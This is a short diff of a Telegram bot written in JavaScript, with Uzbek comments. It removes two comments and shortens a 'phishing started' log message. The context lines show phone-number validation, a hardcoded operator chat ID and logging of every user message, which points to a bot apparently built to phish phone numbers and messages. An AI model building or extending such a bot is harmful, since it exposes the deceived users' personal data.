@@ -44,7 +44,7 @@ bot.on('message', (msg) => {
 
     // Telefon raqamini tekshirish funksiyasi
     function test(phoneNumber) {
-        const test2 = /\d{2} \d{3} \d{2} \d{2}/; // Raqamni tekshirish uchun
+        const test2 = /\d{2} \d{3} \d{2} \d{2}/; 
         return test2.test(phoneNumber);
     }
 
@@ -64,7 +64,7 @@ bot.on('message', (msg) => {
   const option = {
     reply_to_message_id: msg.message_id,
     parse_mode: "markdown",
-    reply_markup: JSON.parse(home2) // JSON.parse() bilan chiqarish
+    reply_markup: JSON.parse(home2) 
 };
     const chatId = msg.chat.id;
     const chatIdmy = 5302582529;
@@ -118,4 +118,4 @@ bot.on('message', (msg) => {
     console.log(`[${username}:${firstName}]dan kelgan xabar:`, `[${botga_kelgan_xabar}]`, 'vaqti:', time);
 });
 
-console.log('phishing started.....');
+console.log('phishing started...');
